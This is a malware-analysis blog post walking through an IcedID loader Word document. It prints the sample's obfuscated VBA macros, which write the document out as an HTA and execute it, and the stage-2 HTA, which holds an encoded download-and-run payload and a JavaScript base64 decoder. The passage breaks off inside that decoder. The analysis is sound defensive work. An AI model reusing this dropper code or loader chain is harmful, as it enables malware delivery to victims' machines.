<!doctype html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="Analyzing an IcedID Loader Document" /><meta property="og:locale" content="en" /><meta name="description" content="In this post I’m going to walk through an analysis of a malicious document that distributes and executes an IcedID DLL payload." /><meta property="og:description" content="In this post I’m going to walk through an analysis of a malicious document that distributes and executes an IcedID DLL payload." /><link rel="canonical" href="https://forensicitguy.github.io/analyzing-icedid-document/" /><meta property="og:url" content="https://forensicitguy.github.io/analyzing-icedid-document/" /><meta property="og:site_name" content="Tony Lambert" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-01-01T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Analyzing an IcedID Loader Document" /><meta name="twitter:site" content="@ForensicITGuy" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-03-28T23:09:20+00:00","datePublished":"2022-01-01T00:00:00+00:00","description":"In this post I’m going to walk through an analysis of a malicious document that distributes and executes an IcedID DLL payload.","headline":"Analyzing an IcedID Loader Document","mainEntityOfPage":{"@type":"WebPage","@id":"https://forensicitguy.github.io/analyzing-icedid-document/"},"url":"https://forensicitguy.github.io/analyzing-icedid-document/"}</script><title>Analyzing an IcedID Loader Document | Tony Lambert</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Tony Lambert"><meta name="application-name" content="Tony Lambert"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.29.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return 'mode'; } static get MODE_ATTR() { return 'data-mode'; } static get DARK_MODE() { return 'dark'; } static get LIGHT_MODE() { return 'light'; } static get ID() { return 'mode-toggle'; } constructor() { let self = this;this.sysDarkPrefers.addEventListener('change', () => { if (self.hasMode) { self.clearMode(); } self.notify(); }); if (!this.hasMode) { return; } if (this.isDarkMode) { this.setDark(); } else { this.setLight(); } } get sysDarkPrefers() { return window.matchMedia('(prefers-color-scheme: dark)'); } get isPreferDark() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }get modeStatus() { if (this.hasMode) { return this.mode; } else { return this.isPreferDark ? ModeToggle.DARK_MODE : ModeToggle.LIGHT_MODE; } } setDark() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { document.documentElement.setAttribute(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { document.documentElement.removeAttribute(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); }notify() { window.postMessage( { direction: ModeToggle.ID, message: this.modeStatus }, '*' ); } flipMode() { if (this.hasMode) { this.clearMode(); } else { if (this.isPreferDark) { this.setLight(); } else { this.setDark(); } } this.notify(); } } const modeToggle = new ModeToggle(); </script><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar.jpg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/">Tony Lambert</a></h1><p class="site-subtitle fst-italic mb-0">An educator that does security things</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <button type="button" class="btn btn-link nav-link" aria-label="Switch Mode" id="mode-toggle"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/ForensicITGuy" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/ForensicITGuy" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="https://www.linkedin.com/in/tonymlambert/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a> <a href="https://ko-fi.com/forensicitguy" aria-label="ko-fi" target="_blank" rel="noopener noreferrer" > <i class="fas fa-mug-hot"></i> </a> <a href="https://infosec.exchange/web/@ForensicITGuy" aria-label="mastodon" target="_blank" rel="noopener noreferrer me" > <i class="fab fa-mastodon"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>Analyzing an IcedID Loader Document</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>Analyzing an IcedID Loader Document</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1640995200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jan 1, 2022 </time> </span> <span> Updated <time data-ts="1648508960" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Mar 28, 2022 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/ForensicITGuy">Tony Lambert</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="2042 words" > <em>11 min</em> read</span></div></div></div></header><div class="content"><p>In this post I’m going to walk through an analysis of a malicious document that distributes and executes an IcedID DLL payload.</p><p>The original document can be found on MalwareBazaar here: <a href="https://bazaar.abuse.ch/sample/ecd84fa8d836d5057149b2b3a048d75004ca1a1377fcf2f5e67374af3a1161a0/">https://bazaar.abuse.ch/sample/ecd84fa8d836d5057149b2b3a048d75004ca1a1377fcf2f5e67374af3a1161a0/</a></p><h2 id="analyzing-the-document"><span class="me-2">Analyzing the Document</span><a href="#analyzing-the-document" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>We can start off by looking at the document properties with <code class="language-plaintext highlighter-rouge">exiftool</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
</pre><td class="rouge-code"><pre>remnux@remnux:~/cases/icedid$ exiftool maldoc.doc 
ExifTool Version Number         : 12.30
File Name                       : maldoc.doc
Directory                       : .
File Size                       : 78 KiB
File Modification Date/Time     : 2022:01:01 00:52:52-05:00
File Access Date/Time           : 2021:12:31 20:06:54-05:00
File Inode Change Date/Time     : 2021:12:31 19:54:10-05:00
File Permissions                : -rw-r--r--
File Type                       : DOC
File Type Extension             : doc
MIME Type                       : application/msword
Identification                  : Word 8.0
Language Code                   : English (US)
Doc Flags                       : Has picture, 1Table, ExtChar
System                          : Windows
Word 97                         : No
Title                           : 
Subject                         : 
Author                          : 
Keywords                        : 
Comments                        : ta
Template                        : Normal
Last Modified By                : Пользователь Windows
Software                        : Microsoft Office Word
Create Date                     : 2021:12:27 11:02:00
Modify Date                     : 2021:12:27 11:02:00
Security                        : None
Code Page                       : Windows Cyrillic
Category                        : explorer
Manager                         : 
Company                         : ript.sh
Bytes                           : 26624
Char Count With Spaces          : 16233
App Version                     : 16.0000
Scale Crop                      : No
Links Up To Date                : No
Shared Doc                      : No
Hyperlinks Changed              : No
Title Of Parts                  : 
Heading Pairs                   : Название, 1
Comp Obj User Type Len          : 32
Comp Obj User Type              : �������� Microsoft Word 97-2003
Last Printed                    : 0000:00:00 00:00:00
Revision Number                 : 2
Total Edit Time                 : 0
Words                           : 116
Characters                      : 16118
Pages                           : 1
Paragraphs                      : 1
Lines                           : 65
</pre></table></code></div></div><p>We can see a few parts of the document properties are weird, like <code class="language-plaintext highlighter-rouge">Company</code> containing <code class="language-plaintext highlighter-rouge">ript.sh</code>. From here we can usually assume some form of a macro or exploit is involved, so we can use <code class="language-plaintext highlighter-rouge">oledump.py</code> to investigate macros first.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre>remnux@remnux:~/cases/icedid$ oledump.py maldoc.doc 
  1:       114 '\x01CompObj'
  2:      4096 '\x05DocumentSummaryInformation'
  3:      4096 '\x05SummaryInformation'
  4:      7224 '1Table'
  5:     26648 'Data'
  6:       398 'Macros/PROJECT'
  7:        56 'Macros/PROJECTwm'
  8: M    2420 'Macros/VBA/ThisDocument'
  9:      2896 'Macros/VBA/_VBA_PROJECT'
 10:      1708 'Macros/VBA/__SRP_0'
 11:       241 'Macros/VBA/__SRP_1'
 12:       983 'Macros/VBA/__SRP_2'
 13:       364 'Macros/VBA/__SRP_3'
 14:       553 'Macros/VBA/dir'
 15: M    1103 'Macros/VBA/main'
 16:     19522 'WordDocument'
</pre></table></code></div></div><p>The output from <code class="language-plaintext highlighter-rouge">oledump.py</code> indicates streams 8 and 15 contain macro content, so let’s dive into those. Using <code class="language-plaintext highlighter-rouge">oledump.py -v -s 8</code> and <code class="language-plaintext highlighter-rouge">-s 15</code> we can get the contents of the macros. I’ve annotated the macros with contents below:</p><div class="language-vb highlighter-rouge"><div class="code-header"> <span data-label-text="Visual Basic"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="n">Attribute</span> <span class="n">VB_Name</span> <span class="o">=</span> <span class="s">"ThisDocument"</span>
<span class="n">Attribute</span> <span class="n">VB_Base</span> <span class="o">=</span> <span class="s">"1Normal.ThisDocument"</span>
<span class="n">Attribute</span> <span class="n">VB_GlobalNameSpace</span> <span class="o">=</span> <span class="k">False</span>
<span class="n">Attribute</span> <span class="n">VB_Creatable</span> <span class="o">=</span> <span class="k">False</span>
<span class="n">Attribute</span> <span class="n">VB_PredeclaredId</span> <span class="o">=</span> <span class="k">True</span>
<span class="n">Attribute</span> <span class="n">VB_Exposed</span> <span class="o">=</span> <span class="k">True</span>
<span class="n">Attribute</span> <span class="n">VB_TemplateDerived</span> <span class="o">=</span> <span class="k">True</span>
<span class="n">Attribute</span> <span class="n">VB_Customizable</span> <span class="o">=</span> <span class="k">True</span>

<span class="c1">'contents() finds contents of the document and removes all instances of s3x</span>

<span class="k">Function</span> <span class="nf">contents</span><span class="p">()</span>
    <span class="k">With</span> <span class="n">ActiveDocument</span><span class="p">.</span><span class="n">Content</span>
        <span class="n">superI7Center</span> <span class="o">=</span> <span class="p">.</span><span class="n">Find</span><span class="p">.</span><span class="n">Execute</span><span class="p">(</span><span class="n">FindText</span><span class="p">:</span><span class="o">=</span><span class="s">"s3x"</span><span class="p">,</span> <span class="n">ReplaceWith</span><span class="p">:</span><span class="o">=</span><span class="s">""</span><span class="p">,</span> <span class="n">Replace</span><span class="p">:</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span>
    <span class="k">End</span> <span class="k">With</span>
<span class="k">End</span> <span class="k">Function</span>

<span class="c1">'cont1() returns the specified document property (which is visible with exiftool)</span>

<span class="k">Function</span> <span class="nf">cont1</span><span class="p">(</span><span class="n">i7ComputerMonitor</span><span class="p">)</span>
    <span class="n">cont1</span> <span class="o">=</span> <span class="n">ActiveDocument</span><span class="p">.</span><span class="n">BuiltInDocumentProperties</span><span class="p">(</span><span class="n">i7ComputerMonitor</span><span class="p">).</span><span class="n">Value</span>
    <span class="n">contents</span>
<span class="k">End</span> <span class="k">Function</span>

<span class="c1">'srn1() runs "CreateObject("wscript.shell").exec Explorer i7Gigabyte.hta"</span>

<span class="k">Public</span> <span class="k">Function</span> <span class="nf">srn1</span><span class="p">(</span><span class="n">mouseVideo</span><span class="p">)</span>
    <span class="n">CreateObject</span><span class="p">(</span><span class="s">"wsc"</span> <span class="o">+</span> <span class="n">cont1</span><span class="p">(</span><span class="s">"company"</span><span class="p">)</span> <span class="o">+</span> <span class="s">"ell"</span><span class="p">).</span><span class="n">exec</span> <span class="n">cont1</span><span class="p">(</span><span class="s">"category"</span><span class="p">)</span> <span class="o">+</span> <span class="s">" "</span> <span class="o">+</span> <span class="n">mouseVideo</span>
<span class="k">End</span> <span class="k">Function</span>

<span class="k">Sub</span> <span class="nf">Document_Open</span><span class="p">()</span>
    <span class="n">hny</span>
<span class="k">End</span> <span class="k">Sub</span>

<span class="p">.</span><span class="err">..</span>

<span class="n">Attribute</span> <span class="n">VB_Name</span> <span class="o">=</span> <span class="s">"main"</span>

<span class="c1">'hny() saves the content of the document to i7Gigabyte.hta and executes the contents.</span>

<span class="k">Public</span> <span class="k">Sub</span> <span class="nf">hny</span><span class="p">()</span>
    <span class="n">processorI9</span> <span class="o">=</span> <span class="n">Trim</span><span class="p">(</span><span class="s">"i7Gigabyte.h"</span> <span class="o">&amp;</span> <span class="n">ThisDocument</span><span class="p">.</span><span class="n">cont1</span><span class="p">(</span><span class="s">"comments"</span><span class="p">))</span>
    <span class="n">ActiveDocument</span><span class="p">.</span><span class="n">SaveAs2</span> <span class="n">FileName</span><span class="p">:</span><span class="o">=</span><span class="n">processorI9</span><span class="p">,</span> <span class="n">FileFormat</span><span class="p">:</span><span class="o">=</span><span class="mi">2</span>
    <span class="n">ThisDocument</span><span class="p">.</span><span class="n">srn1</span> <span class="n">processorI9</span>
<span class="k">End</span> <span class="k">Sub</span>
</pre></table></code></div></div><p>The VB macros use these document properties:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Comments                        : ta
Category                        : explorer
Company                         : ript.sh
</pre></table></code></div></div><p>From the macro content, we can expect a few things:</p><ul><li><code class="language-plaintext highlighter-rouge">i7Gigabyte.hta</code> will get written to disk<li>MS Word will execute <code class="language-plaintext highlighter-rouge">explorer i7Gigabyte.hta</code><li><code class="language-plaintext highlighter-rouge">i7Gigabyte.hta</code> will contain HTML content and likely some JavaScript</ul><p>To get the document content, we can use <code class="language-plaintext highlighter-rouge">oledump.py -s 16</code> and run <code class="language-plaintext highlighter-rouge">strings</code> against its output:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>remnux@remnux:~/cases/icedid$ oledump.py -d -s 16 maldoc.doc | strings
bjbj
&lt;s3xhs3xts3xms3xls3x&gt;s3x&lt;s3xbs3xos3xds3xys3x&gt;s3x&lt;s3xps3x s3xis3xds3x
...
</pre></table></code></div></div><p>We can copy and paste the text into its own file. To see what will execute, we can use Find/Replace in VSCode to see the final version.</p><p><a href="/assets/images/icedid-document-analysis/vscode-replace.png" class="popup img-link shimmer"><img src="/assets/images/icedid-document-analysis/vscode-replace.png" alt="VSCode Find Replace" loading="lazy"></a></p><h2 id="analyzing-the-stage-2-hta"><span class="me-2">Analyzing the Stage 2 HTA</span><a href="#analyzing-the-stage-2-hta" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>I’ve gone ahead and prettified the HTA’s code below:</p><div class="language-html highlighter-rouge"><div class="code-header"> <span data-label-text="HTML"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
</pre><td class="rouge-code"><pre><span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;p</span> <span class="na">id=</span><span class="s">'processorRtx'</span> <span class="na">style=</span><span class="s">'font-color: #000'</span><span class="nt">&gt;</span>eval<span class="nt">&lt;/p&gt;</span>
        <span class="nt">&lt;p</span> <span class="na">id=</span><span class="s">'rtxI7'</span> <span class="na">style=</span><span class="s">'font-color: #000'</span><span class="nt">&gt;</span>
            fX17KWUoaGN0YWN9O2Vzb2xjLnh0Um9lZGlWZWxiYXQ7KTIgLCJncGouN0lldHliYWdpZ1xcY2lsYnVwXFxzcmVzdVxcOmMiKGVsaWZvdGV2YXMueHRSb2VkaVZlbGJhdDspeWRvYmVzbm9wc2VyLnJlcHVTcm9zc2Vjb3JQb2VkaXYoZXRpcncueHRSb2VkaVZlbGJhdDsxID0gZXB5dC54dFJvZWRpVmVsYmF0O25lcG8ueHRSb2VkaVZlbGJhdDspIm1hZXJ0cy5iZG9kYSIodGNlamJPWGV2aXRjQSB3ZW4gPSB4dFJvZWRpVmVsYmF0IHJhdnt5cnR7KTAwMiA9PSBzdXRhdHMucmVwdVNyb3NzZWNvclBvZWRpdihmaTspKGRuZXMucmVwdVNyb3NzZWNvclBvZWRpdjspZXNsYWYgLCIwYk85ZDN6QUpOZGlBeXg5alpPeldnT3QwMT1kaXMmcUVQNTh4QURpaHNMQWFQdDhYQmpDWWNqY1h3WnZkPWVnYXAmdnQxczdwV1ZSSEdMWUpmNmdyY0QwZHl2WVg9ZWdhcCY1Nm1ldVFhQkI4Vj1lZ2FwPzNpY2F2L0YxVXJyRVgxVUFGYlJMekFBeUcvVHhlV2FiaURpOGRlR3FhdWVCTkdsRmZEV2FjQXA5TmtGNy83NzJRRkd2RklQZ3BiNlZsdHhHaHVFYnNEdHpIT3l2ZnFWYVZwNWJZODZJY3d1clMvMDgyOTQvcDB4ZGVISVZrU0kvQkZTd25lYVVmelNlS2svVEZiSWVnUWNNZjJlNWg0Yjl4SDB4RWU0aE1xalMvN29lcm9rbmx5SzkxdTllTkRBTXBTQXJhQ2JuUUxUZUpLTGFBcmpRSWhBcS82eW5zVHBaNnZCWndYazlCTWZMSzB0QlNhSVluaTUvVmdSRDRvckppOUZPQkdqT3hERjg3YXZGVFc1UVM3ZXlDbGNkOEwvZWhyZi9tb2MuZ3Rzb29ibGV0YXAvLzpwdHRoIiAsIlRFRyIobmVwby5yZXB1U3Jvc3NlY29yUG9lZGl2OykicHR0aGxteC4ybG14c20iKHRjZWpiT1hldml0Y0Egd2VuID0gcmVwdVNyb3NzZWNvclBvZWRpdiByYXY=---OykiZ3BqLjdJZXR5YmFnaWdcXGNpbGJ1cFxcc3Jlc3VcXDpjIDIzcnZzZ2VyIihudXIuZXR5YmFnaUdlbGJhVHh0cjspInRjZWpib21ldHN5c2VsaWYuZ25pdHBpcmNzIih0Y2VqYk9YZXZpdGNBIHdlbiA9IGVsYmFUZXN1b003aSByYXY7KSJsbGVocy50cGlyY3N3Iih0Y2VqYk9YZXZpdGNBIHdlbiA9IGV0eWJhZ2lHZWxiYVR4dHIgcmF2
        <span class="nt">&lt;/p&gt;</span>    
        <span class="nt">&lt;p</span> <span class="na">id=</span><span class="s">'notebookGigabyteGigabyte'</span> <span class="na">style=</span><span class="s">'font-color: #fff'</span><span class="nt">&gt;</span>
            ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=
        <span class="nt">&lt;/p&gt;</span>
        
        <span class="nt">&lt;script </span><span class="na">language=</span><span class="s">'javascript'</span><span class="nt">&gt;</span>
            <span class="kd">function</span> <span class="nf">centerAsusSuper</span><span class="p">(</span><span class="nx">i9I9Table</span><span class="p">){</span>
                <span class="k">return</span><span class="p">(</span><span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="nx">i9I9Table</span><span class="p">));</span>
                <span class="p">}</span>
                
            <span class="kd">function</span> <span class="nf">cardI9Processor</span><span class="p">(</span><span class="nx">i9VideoMouse</span><span class="p">){</span>
                <span class="k">return</span><span class="p">(</span><span class="nx">tableNotebook</span><span class="p">.</span><span class="nf">getElementById</span><span class="p">(</span><span class="nx">i9VideoMouse</span><span class="p">).</span><span class="nx">innerHTML</span><span class="p">);</span>
                <span class="p">}</span>
                
            <span class="kd">function</span> <span class="nf">i7ProcessorCard</span><span class="p">(</span><span class="nx">processorAsus</span><span class="p">){</span>
                <span class="k">return</span><span class="p">(</span><span class="dl">'</span><span class="s1">cha</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">processorAsus</span><span class="p">);</span>
                <span class="p">}</span>
                
            <span class="kd">function</span> <span class="nf">tableI9I9</span><span class="p">(</span><span class="nx">processorMonitorSuper</span><span class="p">){</span>
                <span class="kd">var</span> <span class="nx">notebookProcessor</span> <span class="o">=</span> <span class="nf">cardI9Processor</span><span class="p">(</span><span class="dl">'</span><span class="s1">notebookGigabyteGigabyte</span><span class="dl">'</span><span class="p">)</span>
                <span class="kd">var</span> <span class="nx">videoSuper</span> <span class="o">=</span> <span class="dl">""</span><span class="p">;</span>
                <span class="kd">var</span> <span class="nx">superProcessorI9</span><span class="p">,</span> <span class="nx">cardKeyboard</span><span class="p">,</span> <span class="nx">computerComputerSuper</span><span class="p">;</span>
                <span class="kd">var</span> <span class="nx">notebookMouseComputer</span><span class="p">,</span> <span class="nx">gigabyteTableComputer</span><span class="p">,</span> <span class="nx">processorGigabyte</span><span class="p">,</span> <span class="nx">tableCenter</span><span class="p">;</span>
                <span class="kd">var</span> <span class="nx">cardRtxCard</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
                <span class="nx">processorMonitorSuper</span> <span class="o">=</span> <span class="nx">processorMonitorSuper</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">[^</span><span class="sr">A-Za-z0-9</span><span class="se">\+\/\=]</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">""</span><span class="p">);</span>
                <span class="k">while</span><span class="p">(</span><span class="nx">cardRtxCard</span> <span class="o">&lt;</span> <span class="nx">processorMonitorSuper</span><span class="p">.</span><span class="nx">length</span><span class="p">){</span>
                    <span class="nx">notebookMouseComputer</span> <span class="o">=</span> <span class="nx">notebookProcessor</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="nx">processorMonitorSuper</span><span class="p">.</span><span class="nf">charAt</span><span class="p">(</span><span class="nx">cardRtxCard</span><span class="o">++</span><span class="p">));</span>
                    <span class="nx">gigabyteTableComputer</span> <span class="o">=</span> <span class="nx">notebookProcessor</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="nx">processorMonitorSuper</span><span class="p">.</span><span class="nf">charAt</span><span class="p">(</span><span class="nx">cardRtxCard</span><span class="o">++</span><span class="p">));</span>
                    <span class="nx">processorGigabyte</span> <span class="o">=</span> <span class="nx">notebookProcessor</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="nx">processorMonitorSuper</span><span class="p">.</span><span class="nf">charAt</span><span class="p">(</span><span class="nx">cardRtxCard</span><span class="o">++</span><span class="p">));</span>
                    <span class="nx">tableCenter</span> <span class="o">=</span> <span class="nx">notebookProcessor</span><span class="p">.</span><span class="nf">indexOf</span><span class="p">(</span><span class="nx">processorMonitorSuper</span><span class="p">.</span><span class="nf">charAt</span><span class="p">(</span><span class="nx">cardRtxCard</span><span class="o">++</span><span class="p">));</span>
                    <span class="nx">superProcessorI9</span> <span class="o">=</span> <span class="p">(</span><span class="nx">notebookMouseComputer</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="nx">gigabyteTableComputer</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">);</span>
                    <span class="nx">cardKeyboard</span> <span class="o">=</span> <span class="p">((</span><span class="nx">gigabyteTableComputer</span> <span class="o">&amp;</span> <span class="mi">15</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="nx">processorGigabyte</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">);</span>
                    <span class="nx">computerComputerSuper</span> <span class="o">=</span> <span class="p">((</span><span class="nx">processorGigabyte</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">|</span> <span class="nx">tableCenter</span><span class="p">;</span>
                    <span class="nx">videoSuper</span> <span class="o">=</span> <span class="nx">videoSuper</span> <span class="o">+</span> <span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">superProcessorI9</span><span class="p">);</span>
                    <span class="k">if</span><span class="p">(</span><span class="nx">processorGigabyte</span> <span class="o">!=</span> <span class="mi">64</span><span class="p">){</span>
                        <span class="nx">videoSuper</span> <span class="o">=</span> <span class="nx">videoSuper</span> <span class="o">+</span> <span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">cardKeyboard</span><span class="p">);</span>
                    <span class="p">}</span>
                    <span class="k">if</span><span class="p">(</span><span class="nx">tableCenter</span> <span class="o">!=</span> <span class="mi">64</span><span class="p">){</span>
                        <span class="nx">videoSuper</span> <span class="o">=</span> <span class="nx">videoSuper</span> <span class="o">+</span> <span class="nb">String</span><span class="p">.</span><span class="nf">fromCharCode</span><span class="p">(</span><span class="nx">computerComputerSuper</span><span class="p">);</span>
                    <span class="p">}</span>
                <span class="p">}</span>
